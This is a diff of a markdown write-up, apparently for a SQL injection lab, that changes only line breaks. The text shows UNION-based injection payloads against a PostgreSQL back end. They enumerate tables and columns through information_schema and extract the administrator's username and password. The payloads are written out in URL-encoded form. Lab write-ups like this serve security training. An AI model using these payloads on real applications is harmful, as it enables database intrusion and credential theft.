@@ -256,20 +256,20 @@ users
 ```
 
 Now that we know it's PostgreSQL, we can list all tables, find the table containing user details, and list out the columns of that table ([5](#5-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases), [6](#6-sql-injeciton-attack-listing-the-database-contents-on-oracle-databases)). PostgreSQL uses the `information_schema` table to store details about table and column names, so I created the following query:
-`UNION SELECT table_name, NULL FROM information_schema.tables`
-Which I translated into the following injection payload:
+`UNION SELECT table_name, NULL FROM information_schema.tables` \
+Which I translated into the following injection payload: \
 `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables+--+`
 
-After scanning the HTML response, it turns out it was a normal-sounding name this time: `users`.
-I proceeded to find the columns of the `users` table using the following query:  
-`UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'`  
-Which I translated into the following payload:  
-`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name%3d'users'+--+`  
+After scanning the HTML response, it turns out it was a normal-sounding name this time: `users`. \
+I proceeded to find the columns of the `users` table using the following query: \
+`UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'` \
+Which I translated into the following payload: \
+`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name%3d'users'+--+`
 
-The table had three (normal-sounding) column names: `username` `password` and `email`.
-As the last exfiltration step, I extracted the username and password of `administrator`:
-`UNION SELECT username, password FROM users WHERE username='administrator'`
-Translated into:
+The table had three (normal-sounding) column names: `username` `password` and `email`. \
+As the last exfiltration step, I extracted the username and password of `administrator`: \
+`UNION SELECT username, password FROM users WHERE username='administrator'` \
+Translated into: \
 `'+UNION+SELECT+username,+password+FROM+users+WHERE+username%3d'administrator'+--+`
 
 And finally, the holy grail:
